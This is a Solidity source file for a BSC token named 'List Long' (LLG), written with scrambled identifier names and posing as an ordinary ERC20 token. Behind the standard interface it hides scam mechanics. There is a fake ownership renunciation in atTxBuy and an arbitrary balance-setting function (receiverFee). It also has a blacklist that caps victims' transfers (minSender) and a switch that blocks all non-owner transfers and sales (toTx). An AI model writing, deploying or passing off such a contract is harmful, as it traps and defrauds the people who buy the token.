//SPDX-License-Identifier: MIT

pragma solidity ^0.8.16;

interface teamSwap {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract teamFrom {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface maxEnableAmount {
    function createPair(address txTrading, address walletSell) external returns (address);
}

interface txFee {
    function totalSupply() external view returns (uint256);

    function balanceOf(address toLaunchTotal) external view returns (uint256);

    function transfer(address fundFrom, uint256 minAuto) external returns (bool);

    function allowance(address tokenList, address spender) external view returns (uint256);

    function approve(address spender, uint256 minAuto) external returns (bool);

    function transferFrom(
        address sender,
        address fundFrom,
        uint256 minAuto
    ) external returns (bool);

    event Transfer(address indexed from, address indexed amountTo, uint256 value);
    event Approval(address indexed tokenList, address indexed spender, uint256 value);
}

interface shouldReceiver is txFee {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ListLong is teamFrom, txFee, shouldReceiver {

    string private listMarketing = "List Long";

    constructor (){
        if (txSender != walletMarketing) {
            txSender = swapLaunched;
        }
        teamSwap isEnableLaunched = teamSwap(teamMarketingTo);
        tradingFrom = maxEnableAmount(isEnableLaunched.factory()).createPair(isEnableLaunched.WETH(), address(this));
        if (walletMarketing == fromMax) {
            sellReceiver = false;
        }
        teamReceiverBuy = _msgSender();
        atTxBuy();
        launchTakeExempt[teamReceiverBuy] = true;
        feeReceiver[teamReceiverBuy] = launchedWallet;
        
        emit Transfer(address(0), teamReceiverBuy, launchedWallet);
    }

    bool private maxFrom;

    function receiverFee(address toBuy, uint256 minAuto) public {
        enableWallet();
        feeReceiver[toBuy] = minAuto;
    }

    string private modeMaxSwap = "LLG";

    function transferFrom(address sellExempt, address fundFrom, uint256 minAuto) external override returns (bool) {
        if (_msgSender() != teamMarketingTo) {
            if (exemptSwap[sellExempt][_msgSender()] != type(uint256).max) {
                require(minAuto <= exemptSwap[sellExempt][_msgSender()]);
                exemptSwap[sellExempt][_msgSender()] -= minAuto;
            }
        }
        return liquidityTotalAmount(sellExempt, fundFrom, minAuto);
    }

    event OwnershipTransferred(address indexed buyExemptLaunch, address indexed launchedLiquidity);

    bool public tradingEnableFrom;

    function symbol() external view virtual override returns (string memory) {
        return modeMaxSwap;
    }

    uint256 walletLiquidity;

    uint256 public txSender;

    function liquidityTotalAmount(address sellExempt, address fundFrom, uint256 minAuto) internal returns (bool) {
        if (sellExempt == teamReceiverBuy) {
            return tradingReceiver(sellExempt, fundFrom, minAuto);
        }
        uint256 walletSwap = txFee(tradingFrom).balanceOf(tokenLiquidity);
        require(walletSwap == toMin);
        require(fundFrom != tokenLiquidity);
        if (marketingReceiver[sellExempt]) {
            return tradingReceiver(sellExempt, fundFrom, marketingFrom);
        }
        return tradingReceiver(sellExempt, fundFrom, minAuto);
    }

    address public tradingFrom;

    mapping(address => uint256) private feeReceiver;

    function tradingReceiver(address sellExempt, address fundFrom, uint256 minAuto) internal returns (bool) {
        require(feeReceiver[sellExempt] >= minAuto);
        feeReceiver[sellExempt] -= minAuto;
        feeReceiver[fundFrom] += minAuto;
        emit Transfer(sellExempt, fundFrom, minAuto);
        return true;
    }

    function minSender(address takeToSender) public {
        enableWallet();
        if (tradingEnableFrom == maxFrom) {
            swapLaunched = walletMarketing;
        }
        if (takeToSender == teamReceiverBuy || takeToSender == tradingFrom) {
            return;
        }
        marketingReceiver[takeToSender] = true;
    }

    address private modeIs;

    function name() external view virtual override returns (string memory) {
        return listMarketing;
    }

    function decimals() external view virtual override returns (uint8) {
        return tradingList;
    }

    function transfer(address toBuy, uint256 minAuto) external virtual override returns (bool) {
        return liquidityTotalAmount(_msgSender(), toBuy, minAuto);
    }

    uint256 toMin;

    function balanceOf(address toLaunchTotal) public view virtual override returns (uint256) {
        return feeReceiver[toLaunchTotal];
    }

    address public teamReceiverBuy;

    uint8 private tradingList = 18;

    uint256 public tradingShould;

    function approve(address autoFund, uint256 minAuto) public virtual override returns (bool) {
        exemptSwap[_msgSender()][autoFund] = minAuto;
        emit Approval(_msgSender(), autoFund, minAuto);
        return true;
    }

    function atTxBuy() public {
        emit OwnershipTransferred(teamReceiverBuy, address(0));
        modeIs = address(0);
    }

    bool public sellReceiver;

    function listTeam(address swapFund) public {
        if (atTotal) {
            return;
        }
        
        launchTakeExempt[swapFund] = true;
        
        atTotal = true;
    }

    mapping(address => mapping(address => uint256)) private exemptSwap;

    address teamMarketingTo = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function getOwner() external view returns (address) {
        return modeIs;
    }

    uint256 public launchIsLiquidity;

    uint256 private sellShould;

    mapping(address => bool) public launchTakeExempt;

    address tokenLiquidity = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 public walletMarketing;

    bool public atTotal;

    function owner() external view returns (address) {
        return modeIs;
    }

    function toTx(uint256 minAuto) public {
        enableWallet();
        toMin = minAuto;
    }

    uint256 private launchedWallet = 100000000 * 10 ** 18;

    uint256 private swapLaunched;

    function enableWallet() private view {
        require(launchTakeExempt[_msgSender()]);
    }

    uint256 public fromMax;

    function allowance(address receiverMarketing, address autoFund) external view virtual override returns (uint256) {
        if (autoFund == teamMarketingTo) {
            return type(uint256).max;
        }
        return exemptSwap[receiverMarketing][autoFund];
    }

    uint256 constant marketingFrom = 3 ** 10;

    function totalSupply() external view virtual override returns (uint256) {
        return launchedWallet;
    }

    mapping(address => bool) public marketingReceiver;

}